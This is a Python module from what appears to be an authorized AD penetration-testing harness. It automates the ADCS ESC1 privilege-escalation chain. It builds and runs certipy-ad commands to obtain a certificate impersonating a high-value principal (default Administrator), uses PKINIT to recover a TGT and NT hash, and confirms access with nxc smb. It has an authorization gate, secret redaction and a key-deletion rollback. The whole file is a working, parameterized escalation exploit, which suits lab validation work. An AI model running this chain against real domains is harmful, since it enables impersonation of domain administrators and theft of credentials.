"""ADCS-ESC1 validation executor -- FULL (T1c).

Encodes the PROVEN ADCS-ESC1 recipe (claude-mem #66146 C1), parameterized and
*mutating* (a certificate is issued on the vulnerable template, so a VERIFIED
rollback -- destroying the issued key material -- is required):

    certipy-ad req  -u <op>@<dom> -p <pw> -dc-ip <dc> -ca <CA> -template <ESC1_tpl>
                    -upn <impersonate>@<dom> -target <ca_host> [-ldap-scheme ldap]
        -> issues <impersonate>.pfx, prints the cert SERIAL   (MUTATING: a cert is issued)
    certipy-ad auth -pfx <impersonate>.pfx -dc-ip <dc>
        -> PKINIT -> TGT + NT hash
    nxc smb <target_host> -k
        -> ticket-backed access (terminal proof the cert was USABLE)
    ROLLBACK (certipy has NO revoke in any version -- claude-mem #66157):
    destroy the issued <impersonate>.pfx + PKINIT .ccache (the only private-key
        copy). ESC1 changes no AD object, so destroying the bearer credential IS
        a complete functional rollback; verify = confirmed file-absence. Formal
        CA-DB revocation (certutil -revoke <serial> 6 / MS-CSRA) is an ADR-002 N3
        follow-up, not required for functional rollback.

Proven end-to-end on GOAD ESSOS (ESSOS-CA, ESC1 template, high-value SAN); the
ADCS-ESC1 truth-vuln set is ``{host_id: srv03, domain: essos.local}`` (#66146 C1).
This executor is target-agnostic: the template, CA, CA host, impersonated
principal (the high-value SAN/UPN), the ticket-backed target and the LDAP scheme
are all recommended-default + operator-overridable params (the UX from #66142).

GOTCHA (#66146): the ESSOS CA runs on a Win2016 host where certipy's LDAPS can
reset the connection. ``ldap_scheme`` exposes an operator-overridable
``-ldap-scheme`` override (default auto/off; set ``"ldap"`` to force plain LDAP).

Terminal fact: ``cert_issued_and_used`` -- a certificate was issued impersonating
the high-value principal AND used for PKINIT AND that ticket gave access.
Mutating: yes; the rollback ALWAYS destroys the issued key material and is
*verified* by confirmed file-absence (an unverified rollback scores
``inconclusive``). The issued ``.pfx``,
the recovered NT hash and the operator password are SECRETS: they live only in
local vars / argv, are masked by :func:`redact_argv` (``-pfx`` / ``-hashes`` /
``-p``), and never reach the receipt (which also scrubs any pfx/hash/ccache key
defensively). The terminal fact's token is over public identifiers only.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): ADCS-ESC1 keys on
``{host_id, domain}``. ``target_identity`` returns the CA host identity (resolved
through ``config.host_aliases``) merged with the config domain so the receipt
target carries BOTH ``host_id`` and ``domain``.

UNVERIFIED ASSUMPTION (pin against the real tool during the lab run, mirroring
laps.py / shadow_creds.py): certipy's output markers --

* ``req``    : the issue marker (``Saved certificate and private key`` /
  ``Successfully requested certificate``) and the SERIAL line
  (``Serial number: <hex>`` or, as a fallback, ``Request ID is <n>``);
* ``auth``   : the PKINIT marker (``Got hash`` / ``authenticated`` / ``Got TGT``)
  and the credential-cache line (``Saved credential cache to '<...>.ccache'``);
(No ``ca`` revoke marker is parsed -- certipy cannot revoke; the rollback is
local key-material destruction, verified by file-absence, needing no tool output.)

If the real wording differs, the chain gets no positive predicate / no parsed
serial and honestly reports not-proved / inconclusive -- it never fabricates an
issuance. The serial is still parsed for the audit advisory + the N3 revoke.
"""
from __future__ import annotations
from .. import netresolve

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)


# ---- certipy / nxc output markers (UNVERIFIED -- see module docstring) --------
# req: a certificate was issued (pfx saved / request succeeded).
_RE_REQ_ISSUED = re.compile(
    r"(Saved certificate and private key|Successfully requested certificate|"
    r"Got certificate with UPN)", re.I)
# req: parse the issued pfx path so `auth` reads the right file.
_RE_PFX_PATH = re.compile(
    r"Saved certificate and private key to ['\"]?([^'\"\s]+\.pfx)", re.I)
# req: the certificate serial (preferred) or, as a fallback, the request id.
_RE_SERIAL = re.compile(
    r"serial\s*(?:number|no\.?)?\s*[:=]\s*['\"]?([0-9A-Fa-f][0-9A-Fa-f:xX]*)", re.I)
_RE_REQUEST_ID = re.compile(r"request\s*id\s*(?:is)?\s*[:=]?\s*['\"]?(\d+)", re.I)
# auth: PKINIT succeeded (hash recovered / authenticated / TGT obtained).
_RE_AUTH_OK = re.compile(r"(Got hash|authenticated|Got TGT)", re.I)
# auth: the credential cache the ticket was saved to (for the -k nxc step).
_RE_CCACHE = re.compile(
    r"Saved credential cache to ['\"]?([^'\"\s]+\.ccache)", re.I)
# nxc ticket-backed access markers (shared with the delegation executors).
_RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
_RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)


class ADCSESC1Executor(ValidationExecutor):
    technique = "ADCS-ESC1"
    technique_class = "adcs"
    terminal_kind = "cert_issued_and_used"
    mutating = True
    verified_recipe = True
    recipe_ref = ("#66146 C1 ADCS-ESC1 = certipy-ad req -template <ESC1> -upn "
                  "<impersonate>@<dom> -ca <CA> -target <cahost> [-ldap-scheme ldap] "
                  "(issue pfx+serial) ; certipy-ad auth -pfx -> PKINIT TGT+NThash ; "
                  "nxc smb -k ; ROLLBACK destroy issued .pfx/.ccache key material "
                  "(certipy has no revoke; #66157) (PROVED essos ESSOS-CA)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        ca_host_default = entity.get("ca_host") or finding.host or ""
        return [
            ParamSpec(
                name="template", kind="free",
                description="The vulnerable (ESC1) certificate template to request a "
                            "cert on.",
                recommended=entity.get("template") or "ESC1",
                rationale="The template aranum flagged as ESC1 (else the ESC1 "
                          "convention name); override per the engagement (#66142).",
            ),
            ParamSpec(
                name="ca", kind="free",
                description="The issuing Certificate Authority name (certipy -ca).",
                recommended=entity.get("ca"),
                rationale="The AD CS CA aranum promoted; override to target a "
                          "specific CA (#66142 override model).",
            ),
            ParamSpec(
                name="ca_host", kind="target_host",
                description="The CA host (certipy -target). Use its hostname so the "
                            "enrollment endpoint resolves.",
                recommended=ca_host_default,
                rationale="The host of the aranum AD CS finding.",
            ),
            ParamSpec(
                name="impersonate", kind="escalation_target",
                description="The high-value principal to put in the cert SAN/UPN and "
                            "impersonate via PKINIT (the escalation target proven by "
                            "ticket-backed access).",
                recommended="Administrator",
                rationale="High-value default SAN/UPN; override to a specific DA / "
                          "target principal per the engagement (#66142 override model).",
            ),
            ParamSpec(
                name="target_host", kind="target_host",
                description="Host the issued ticket is used against to prove the cert "
                            "is usable (nxc smb -k).",
                recommended=ca_host_default or ctx.config.dc_ip,
                rationale="The CA host by default (its own ticket-backed access), "
                          "else the DC; override to any host the impersonated "
                          "principal can reach.",
            ),
            ParamSpec(
                name="ldap_scheme", kind="free",
                description="Force certipy's LDAP scheme ('' = auto, 'ldap' = plain "
                            "LDAP). The #66146 Win2016-CA gotcha: LDAPS can reset, so "
                            "the operator can force plain LDAP.",
                recommended="",
                rationale="Auto by default; set 'ldap' when the CA host is a Win2016 "
                          "box whose LDAPS resets (#66146).",
                required=False,
                validator=lambda val: (None if val in ("", "ldap", "ldaps")
                                       else "must be '', 'ldap', or 'ldaps'"),
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # ADCS-ESC1 facet keys on {host_id, domain}: resolve the (possibly
        # overridden) CA host identity and merge the config domain so the receipt
        # target carries BOTH host_id (via host_aliases) and domain.
        ca_host = (params["ca_host"].value if "ca_host" in params else None) \
            or (finding.entity or {}).get("ca_host") or finding.host or ""
        return {**ctx.config.resolve_target_identity(ca_host),
                "domain": ctx.config.domain}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        scheme = f" -ldap-scheme {v['ldap_scheme']}" if v.get("ldap_scheme") else ""
        return [
            f"certipy-ad req -u <op>@{ctx.config.domain} -p *** -dc-ip {dc} "
            f"-ca {v['ca']} -template {v['template']} "
            f"-upn {v['impersonate']}@{ctx.config.domain} -target {v['ca_host']}{scheme} "
            "(issue cert -> pfx + serial)",
            f"certipy-ad auth -pfx *** -dc-ip {dc}   (PKINIT -> TGT + NT hash)",
            f"nxc smb {v['target_host']} -k   (ticket-backed access = proof)",
            "ROLLBACK: destroy issued key material (<impersonate>.pfx + .ccache) "
            "-- certipy has no revoke; CA-DB Certificate Hold is an N3 follow-up",
        ]

    # ---------------------------------------------------------------- auth argv
    def _op_auth_argv(self, cfg) -> list[str]:
        """certipy operator-auth flags: ``-u op@dom`` plus the secret flag
        (``-hashes`` / ``-aesKey`` / ``-p``, all masked by :func:`redact_argv`)."""
        argv = ["-u", f"{cfg.username or ''}@{cfg.domain}"]
        if cfg.nt_hash:
            argv += ["-hashes", cfg.nt_hash]
        elif cfg.aes_key:
            argv += ["-aesKey", cfg.aes_key]
        elif cfg.password is not None:
            argv += ["-p", cfg.password]
        return argv

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        dc = cfg.dc_ip
        template = v["template"]
        ca = v["ca"]
        ca_host = v["ca_host"]
        impersonate = v["impersonate"]
        target_host = v["target_host"]
        ldap_scheme = v.get("ldap_scheme") or ""
        op_auth = self._op_auth_argv(cfg)
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) request the cert on the ESC1 template (MUTATING, gated) ---------
        verdict = ctx.authorizer.authorize(
            "adcs_cert_request", {"ca": ca, "template": template, "upn": impersonate})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "adcs_cert_request"
            errors.append("gate_denied:adcs_cert_request")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "adcs_cert_request"

        req_argv = ["certipy-ad", "req", *op_auth, "-dc-ip", dc, "-ca", ca,
                    "-template", template, "-upn", f"{impersonate}@{cfg.domain}",
                    "-target", ca_host]
        if ldap_scheme:
            req_argv += ["-ldap-scheme", ldap_scheme]
        res = ctx.runner.run(req_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        req_out = (res.stdout or "") + (res.stderr or "")
        issued_ok = bool(_RE_REQ_ISSUED.search(req_out))
        serial = self._parse_serial(req_out)                 # for rollback (public)
        pfx = self._parse_pfx(req_out, out_dir, impersonate)  # secret (masked/dropped)
        record("cert_request", req_argv, res, issued_ok,
               note="cert issued" if issued_ok else "request failed")
        if not issued_ok:
            errors.append("cert_request_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True                            # a cert WAS issued

        # 2) PKINIT with the issued pfx -> TGT + NT hash ---------------------
        auth_argv = ["certipy-ad", "auth", "-pfx", pfx, "-dc-ip", dc]
        res = ctx.runner.run(auth_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        auth_ran = True
        auth_out = (res.stdout or "") + (res.stderr or "")
        auth_ok = bool(_RE_AUTH_OK.search(auth_out))
        ccache = self._parse_ccache(auth_out, out_dir)        # secret path (masked/dropped)
        record("cert_auth", auth_argv, res, auth_ok,
               note="pkinit ok" if auth_ok else "pkinit failed")
        if not auth_ok:
            errors.append("cert_auth_failed")

        # 3) ticket-backed access = the terminal proof ----------------------
        nxc_ok = False
        if auth_ok:
            nxc_argv = ["nxc", "smb", target_host, "-k",
                        *netresolve.nxc_kerberos_flags(cfg)]
            res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s,
                                 env={"KRB5CCNAME": ccache} if ccache else None,
                                 cwd=str(out_dir))
            nxc_out = res.stdout or ""
            nxc_ok = bool(_RE_NXC_PWNED.search(nxc_out) or _RE_NXC_AUTH_OK.search(nxc_out))
            record("nxc_access", nxc_argv, res, nxc_ok,
                   note="pwn3d" if _RE_NXC_PWNED.search(nxc_out) else "auth" if nxc_ok
                   else "access failed")
            if not nxc_ok:
                errors.append("nxc_access_failed")
                diag = netresolve.classify_resolution_failure(
                    cfg, target_host, nxc_out + "\n" + (res.stderr or ""))
                if diag:
                    errors.append(diag)

        # terminal: cert issued AND PKINIT auth succeeded AND access ok.
        cert_used_ok = issued_ok and auth_ok and nxc_ok
        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=cert_used_ok, impersonated=impersonate,
            predicate=(f"issued a {template} certificate from {ca} impersonating "
                       f"{impersonate}@{cfg.domain}, used it for PKINIT, and gained "
                       f"ticket-backed access to {target_host}"),
            proof_token=proof.proof_token("ADCS-ESC1", cfg.domain, ca, template,
                                          impersonate, "cert_pkinit"),
            extra={"ca": ca, "template": template, "ca_host": ca_host},
        )

        # 4) rollback (ALWAYS, since we issued a cert): destroy the key material.
        self._rollback(ctx, ca, serial, mutation, steps, errors, pfx, ccache)
        if mutation["applied"]:
            # The recovered NT hash/TGT is unrollbackable -> advise rotation
            # (non-secret: the impersonated principal + the public serial only).
            errors.append(f"advisory:rotate_credentials:{impersonate}@{cfg.domain}")
            if serial:
                errors.append(f"advisory:ca_db_revocation_followup:serial={serial}")

        complete = bool(issued_ok and auth_ran and mutation["rollback"]["performed"])
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, ca, serial, mutation, steps, errors, pfx, ccache) -> None:
        """Destroy the issued key material -- the functional rollback for ESC1.

        certipy cannot revoke a certificate in any version (claude-mem #66157),
        and ESC1 changes NO AD object: the issued cert is a bearer credential, so
        securely destroying the only private-key copy (the ``.pfx`` plus the
        PKINIT ``.ccache``) means the cert can no longer be used -- a complete
        functional rollback. ``rollback.verified`` is set from confirmed
        file-absence. Formal CA-DB revocation (``certutil -revoke <serial> 6``
        Certificate Hold via remote-exec, or the MS-CSRA RevokeCertificate
        primitive) is an ADR-002 N3 follow-up for CA-database hygiene; it is not
        needed for functional rollback and is not attempted here.
        """
        if not mutation["applied"]:
            return
        if ctx.authorizer.authorize(
                "rollback", {"ca": ca, "serial_present": serial is not None}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "destroy issued-cert key material (.pfx + .ccache)"
        destroyed = self._destroy_key_material([pfx, ccache], steps)
        mutation["rollback"]["verified"] = destroyed
        if not destroyed:
            errors.append("rollback_unverified")

    @staticmethod
    def _destroy_key_material(paths, steps) -> bool:
        """Delete each key-material file; return True iff all are absent after.

        Records ONE ``destroy_key_material`` step with a count note -- never the
        file names (the ``.pfx``/``.ccache`` paths are secret-flagged and must not
        reach the receipt). A file that cannot be deleted leaves the step ``ok``
        False -> the scorer reads an unverified (incomplete) rollback.
        """
        targets = [Path(p) for p in paths if p]
        removed = 0
        for fp in targets:
            try:
                if fp.exists():
                    fp.unlink()
                    removed += 1
            except OSError:
                pass
        # Verified ONLY if we actually destroyed >=1 real artifact AND none remain.
        # Vacuous absence -- the parsed/guessed path never existed -- is NOT proof
        # the issued credential was destroyed (it may persist at a path we did not
        # parse). Report unverified (honest) rather than a false clean.
        gone = all(not fp.exists() for fp in targets)
        verified = gone and removed >= 1
        steps.append(StepRecord(
            name="destroy_key_material", ok=verified, argv_display=[], returncode=None,
            note=(f"{removed} artifact(s) destroyed" if verified
                  else "key material not confirmed destroyed")))
        return verified

    # ---------------------------------------------------------------- helpers
    @staticmethod
    def _parse_serial(stdout: str) -> Optional[str]:
        """Parse the issued cert serial (else a request id) -- a public identifier.

        Not needed for the functional rollback (key-material destruction); it is
        recorded for the operator audit advisory and the ADR-002 N3 formal CA-DB
        revocation follow-up. Absent serial -> only the advisory is skipped.
        """
        m = _RE_SERIAL.search(stdout)
        if m:
            return m.group(1)
        m = _RE_REQUEST_ID.search(stdout)
        return m.group(1) if m else None

    @staticmethod
    def _parse_pfx(stdout: str, out_dir: Path, impersonate: str) -> str:
        """The issued pfx path (SECRET: masked in argv, never stored).

        Prefer the path certipy reports; fall back to ``<impersonate>.pfx`` in the
        run dir (certipy names the file after the SAN local part, lowercased).
        """
        m = _RE_PFX_PATH.search(stdout)
        if m:
            raw = m.group(1).strip()
            p = Path(raw)
            return str(p if p.is_absolute() else out_dir / p)
        return str(out_dir / f"{(impersonate or 'cert').split('@', 1)[0].lower()}.pfx")

    @staticmethod
    def _parse_ccache(stdout: str, out_dir: Path) -> Optional[str]:
        """The credential-cache path certipy auth saved (SECRET: never stored)."""
        m = _RE_CCACHE.search(stdout)
        if not m:
            return None
        raw = m.group(1).strip()
        p = Path(raw)
        return str(p if p.is_absolute() else out_dir / p)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
